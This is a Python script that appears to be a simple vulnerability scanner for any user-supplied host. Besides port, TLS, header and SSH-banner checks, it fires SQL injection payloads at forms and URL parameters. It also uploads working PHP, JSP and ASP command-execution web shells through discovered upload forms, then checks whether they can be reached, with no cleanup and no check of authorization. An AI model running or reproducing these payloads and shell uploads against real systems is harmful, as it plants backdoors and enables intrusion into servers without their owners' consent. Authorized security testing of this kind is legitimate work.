#!/usr/bin/env python3
import socket
import threading
import subprocess
import requests
import ssl
import datetime
import random
import string
import os
import tempfile
import re
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse

class SimpleVulnScanner:
    def __init__(self, target):
        self.target = target
        self.open_ports = []
        self.vulnerabilities = []
    
    def port_scan(self, port):
        """Basic port scanning"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)  # Increased timeout for localhost
            result = sock.connect_ex((self.target, port))
            if result == 0:
                self.open_ports.append(port)
                print(f"[+] Port {port} is open")
            sock.close()
        except Exception as e:
            pass
    
    def scan_common_ports(self):
        """Scan common ports"""
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1723, 3000, 3306, 3389, 5000, 5432, 5900, 8000, 8080, 8443, 8888, 9000]
        
        print(f"[*] Scanning {self.target} for open ports...")
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(self.port_scan, common_ports)
    
    def check_ssl_vulnerabilities(self):
        """Check for SSL/TLS vulnerabilities"""
        if 443 in self.open_ports:
            try:
                context = ssl.create_default_context()
                with socket.create_connection((self.target, 443), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=self.target) as ssock:
                        cert = ssock.getpeercert()
                        
                        # Check certificate expiration
                        not_after = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        days_until_expiry = (not_after - datetime.datetime.now()).days
                        
                        if days_until_expiry < 30:
                            self.vulnerabilities.append(f"SSL Certificate expires in {days_until_expiry} days")
                        
                        # Check SSL version
                        if ssock.version() in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                            self.vulnerabilities.append(f"Weak SSL/TLS version: {ssock.version()}")
                            
            except Exception as e:
                self.vulnerabilities.append(f"SSL check failed: {str(e)}")
    
    def check_web_vulnerabilities(self):
        """Basic web vulnerability checks"""
        if 80 in self.open_ports or 443 in self.open_ports:
            protocol = "https" if 443 in self.open_ports else "http"
            base_url = f"{protocol}://{self.target}"
            
            try:
                # Check for common directories
                common_dirs = ['/admin', '/login', '/dashboard', '/wp-admin', '/phpmyadmin']
                for directory in common_dirs:
                    try:
                        response = requests.get(f"{base_url}{directory}", timeout=3, allow_redirects=False)
                        if response.status_code == 200:
                            self.vulnerabilities.append(f"Exposed directory found: {directory}")
                    except:
                        pass
                
                # Check HTTP headers
                response = requests.get(base_url, timeout=5)
                headers = response.headers
                
                security_headers = {
                    'X-Frame-Options': 'Missing X-Frame-Options header (Clickjacking vulnerability)',
                    'X-XSS-Protection': 'Missing X-XSS-Protection header',
                    'X-Content-Type-Options': 'Missing X-Content-Type-Options header',
                    'Strict-Transport-Security': 'Missing HSTS header (HTTPS sites)',
                    'Content-Security-Policy': 'Missing Content Security Policy header'
                }
                
                for header, message in security_headers.items():
                    if header not in headers:
                        self.vulnerabilities.append(message)
                
                # Check for server information disclosure
                if 'Server' in headers:
                    self.vulnerabilities.append(f"Server information disclosed: {headers['Server']}")
                
            except Exception as e:
                print(f"[!] Web vulnerability check failed: {str(e)}")
    
    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        if 80 not in self.open_ports and 443 not in self.open_ports:
            return
            
        protocol = "https" if 443 in self.open_ports else "http"
        base_url = f"{protocol}://{self.target}"
        
        # SQL injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1#",
            "' or 1=1--",
            "') or '1'='1--",
            "') or ('1'='1--",
            "1' OR '1'='1",
            "x' OR 1=1 OR 'x'='y",
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--"
        ]
        
        # Common parameter names to test
        common_params = ['id', 'user', 'username', 'email', 'search', 'q', 'query', 'name', 'page']
        
        print("[*] Testing for SQL injection vulnerabilities...")
        
        try:
            # First, try to find forms on the main page using regex
            response = requests.get(base_url, timeout=5)
            html_content = response.text
            
            # Find forms using regex
            form_pattern = r'<form[^>]*>(.*?)</form>'
            forms = re.findall(form_pattern, html_content, re.DOTALL | re.IGNORECASE)
            
            # Test forms for SQL injection
            for form_html in forms:
                # Extract form action
                action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                action = action_match.group(1) if action_match else ''
                form_url = urljoin(base_url, action)
                
                # Extract form method
                method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                method = method_match.group(1).lower() if method_match else 'get'
                
                # Find input fields
                input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>'
                input_names = re.findall(input_pattern, form_html, re.IGNORECASE)
                
                form_data = {}
                for input_name in input_names:
                    form_data[input_name] = "test"
                
                # Test each form field with SQL payloads
                for field_name in form_data.keys():
                    for payload in sql_payloads[:5]:  # Test first 5 payloads to avoid too many requests
                        test_data = form_data.copy()
                        test_data[field_name] = payload
                        
                        try:
                            if method == 'post':
                                test_response = requests.post(form_url, data=test_data, timeout=3)
                            else:
                                test_response = requests.get(form_url, params=test_data, timeout=3)
                            
                            # Check for SQL error messages
                            error_indicators = [
                                'sql syntax', 'mysql_fetch', 'ORA-', 'Microsoft OLE DB',
                                'ODBC SQL', 'SQLServer JDBC', 'PostgreSQL', 'sqlite3.OperationalError',
                                'MySQLdb.', 'psycopg2.', 'sqlite3.', 'java.sql.SQLException'
                            ]
                            
                            response_text = test_response.text.lower()
                            for error in error_indicators:
                                if error.lower() in response_text:
                                    self.vulnerabilities.append(f"Potential SQL Injection in form field '{field_name}' at {form_url}")
                                    break
                                    
                        except:
                            continue
            
            # Test URL parameters for SQL injection
            test_urls = [
                f"{base_url}/index.php",
                f"{base_url}/login.php",
                f"{base_url}/search.php",
                f"{base_url}/product.php",
                f"{base_url}/user.php"
            ]
            
            for url in test_urls:
                for param in common_params[:3]:  # Test first 3 common params
                    for payload in sql_payloads[:3]:  # Test first 3 payloads
                        try:
                            test_response = requests.get(f"{url}?{param}={payload}", timeout=3)
                            response_text = test_response.text.lower()
                            
                            error_indicators = ['sql syntax', 'mysql_fetch', 'ORA-', 'Microsoft OLE DB']
                            for error in error_indicators:
                                if error.lower() in response_text:
                                    self.vulnerabilities.append(f"Potential SQL Injection in URL parameter '{param}' at {url}")
                                    break
                        except:
                            continue
                            
        except Exception as e:
            print(f"[!] SQL injection testing failed: {str(e)}")
    
    def test_file_upload(self):
        """Test for unrestricted file upload vulnerabilities"""
        if 80 not in self.open_ports and 443 not in self.open_ports:
            return
            
        protocol = "https" if 443 in self.open_ports else "http"
        base_url = f"{protocol}://{self.target}"
        
        print("[*] Testing for file upload vulnerabilities...")
        
        try:
            # Get the main page and look for file upload forms using regex
            response = requests.get(base_url, timeout=5)
            html_content = response.text
            
            # Find forms with file inputs using regex
            form_pattern = r'<form[^>]*>(.*?)</form>'
            forms = re.findall(form_pattern, html_content, re.DOTALL | re.IGNORECASE)
            
            upload_forms = []
            for form_html in forms:
                # Check if form has file input
                if re.search(r'<input[^>]*type=["\']file["\'][^>]*>', form_html, re.IGNORECASE):
                    # Extract form action
                    action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                    action = action_match.group(1) if action_match else ''
                    
                    # Extract file input names
                    file_input_pattern = r'<input[^>]*type=["\']file["\'][^>]*name=["\']([^"\']*)["\'][^>]*>'
                    file_inputs = re.findall(file_input_pattern, form_html, re.IGNORECASE)
                    
                    if file_inputs:
                        upload_forms.append((action, file_inputs, form_html))
            
            if not upload_forms:
                # Try common upload endpoints
                common_upload_paths = [
                    '/upload', '/upload.php', '/fileupload', '/fileupload.php',
                    '/admin/upload', '/admin/fileupload', '/wp-admin/upload.php'
                ]
                
                for path in common_upload_paths:
                    try:
                        test_response = requests.get(urljoin(base_url, path), timeout=3)
                        if test_response.status_code == 200 and 'upload' in test_response.text.lower():
                            self.vulnerabilities.append(f"Potential file upload endpoint found: {path}")
                    except:
                        continue
                return
            
            # Test file upload forms
            for action, file_input_names, form_html in upload_forms:
                upload_url = urljoin(base_url, action) if action else base_url
                
                # Create test files with different extensions
                test_files = self.create_test_files()
                
                for input_name in file_input_names:
                    
                    # Test each malicious file type
                    for filename, content, file_type in test_files:
                        try:
                            files = {input_name: (filename, content, 'text/plain')}
                            
                            # Get other form fields using regex
                            form_data = {}
                            other_input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*(?:type=["\'](?!file|submit|button)[^"\']*["\'])?[^>]*>'
                            other_inputs = re.findall(other_input_pattern, form_html, re.IGNORECASE)
                            
                            for inp_name in other_inputs:
                                if inp_name not in file_input_names:
                                    form_data[inp_name] = 'test'
                            
                            # Submit the form
                            upload_response = requests.post(upload_url, files=files, data=form_data, timeout=5)
                            
                            # Check for successful upload indicators
                            success_indicators = [
                                'upload successful', 'file uploaded', 'successfully uploaded',
                                'upload complete', 'file saved', 'upload ok'
                            ]
                            
                            response_text = upload_response.text.lower()
                            for indicator in success_indicators:
                                if indicator in response_text:
                                    self.vulnerabilities.append(f"Potential unrestricted file upload: {file_type} file ({filename}) may have been uploaded")
                                    break
                            
                            # Check if file is accessible
                            if upload_response.status_code == 200:
                                # Try common upload directories
                                upload_dirs = ['/uploads/', '/files/', '/upload/', '/media/']
                                for upload_dir in upload_dirs:
                                    test_file_url = urljoin(base_url, upload_dir + filename)
                                    try:
                                        file_check = requests.get(test_file_url, timeout=3)
                                        if file_check.status_code == 200:
                                            self.vulnerabilities.append(f"Uploaded file accessible at: {test_file_url}")
                                    except:
                                        continue
                                        
                        except Exception as e:
                            continue
                            
        except Exception as e:
            print(f"[!] File upload testing failed: {str(e)}")
    
    def create_test_files(self):
        """Create test files for upload testing"""
        test_files = []
        
        # PHP shell (basic)
        php_content = "<?php if(isset($_GET['cmd'])) { echo shell_exec($_GET['cmd']); } ?>"
        test_files.append(("test_shell.php", php_content, "PHP shell"))
        
        # JSP shell (basic)
        jsp_content = "<%@ page import=\"java.io.*\" %><% String cmd = request.getParameter(\"cmd\"); if(cmd != null) { Process p = Runtime.getRuntime().exec(cmd); } %>"
        test_files.append(("test_shell.jsp", jsp_content, "JSP shell"))
        
        # ASP shell (basic)
        asp_content = "<%eval request(\"cmd\")%>"
        test_files.append(("test_shell.asp", asp_content, "ASP shell"))
        
        # HTML with JavaScript
        html_content = "<html><body><script>alert('XSS Test - File Upload');</script></body></html>"
        test_files.append(("test.html", html_content, "HTML with JavaScript"))
        
        # Executable disguised as image
        exe_content = "MZ" + "\x00" * 100  # Basic PE header
        test_files.append(("test.jpg.exe", exe_content, "Executable with double extension"))
        
        # SVG with embedded JavaScript
        svg_content = """<svg xmlns="http://www.w3.org/2000/svg">
        <script>alert('SVG XSS Test')</script>
        </svg>"""
        test_files.append(("test.svg", svg_content, "SVG with JavaScript"))
        
        return test_files
    
    def check_ssh_vulnerabilities(self):
        """Basic SSH vulnerability checks"""
        if 22 in self.open_ports:
            try:
                # Try to get SSH banner
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target, 22))
                banner = sock.recv(1024).decode().strip()
                sock.close()
                
                # Check for old SSH versions
                if 'SSH-1.' in banner:
                    self.vulnerabilities.append("SSH version 1.x detected (deprecated)")
                elif 'SSH-2.0' in banner:
                    # Check for specific vulnerable versions
                    if 'OpenSSH_7.4' in banner:
                        self.vulnerabilities.append("Potentially vulnerable OpenSSH version detected")
                
                print(f"[*] SSH Banner: {banner}")
                
            except Exception as e:
                print(f"[!] SSH check failed: {str(e)}")
    
    def run_scan(self):
        """Run the complete vulnerability scan"""
        print(f"[*] Starting vulnerability scan on {self.target}")
        print(f"[*] Scan started at: {datetime.datetime.now()}")
        
        # Port scan
        self.scan_common_ports()
        
        # Force web testing for localhost even if port scan failed
        if self.target in ['localhost', '127.0.0.1'] and not self.open_ports:
            print("[*] Localhost detected - forcing web vulnerability tests on port 80")
            self.open_ports = [80]
        
        if not self.open_ports:
            print("[!] No open ports found")
            return
        
        print(f"[*] Found {len(self.open_ports)} open ports: {self.open_ports}")
        
        # Vulnerability checks
        self.check_ssl_vulnerabilities()
        self.check_web_vulnerabilities()
        self.test_sql_injection()
        self.test_file_upload()
        self.check_ssh_vulnerabilities()
        
        # Report results
        print("\n" + "="*50)
        print("VULNERABILITY SCAN RESULTS")
        print("="*50)
        
        if self.vulnerabilities:
            print(f"[!] Found {len(self.vulnerabilities)} potential vulnerabilities:")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"{i}. {vuln}")
        else:
            print("[+] No obvious vulnerabilities detected")
        
        print(f"\n[*] Scan completed at: {datetime.datetime.now()}")

if __name__ == "__main__":
    target = input("Enter target IP or hostname: ")
    scanner = SimpleVulnScanner(target)
    scanner.run_scan()
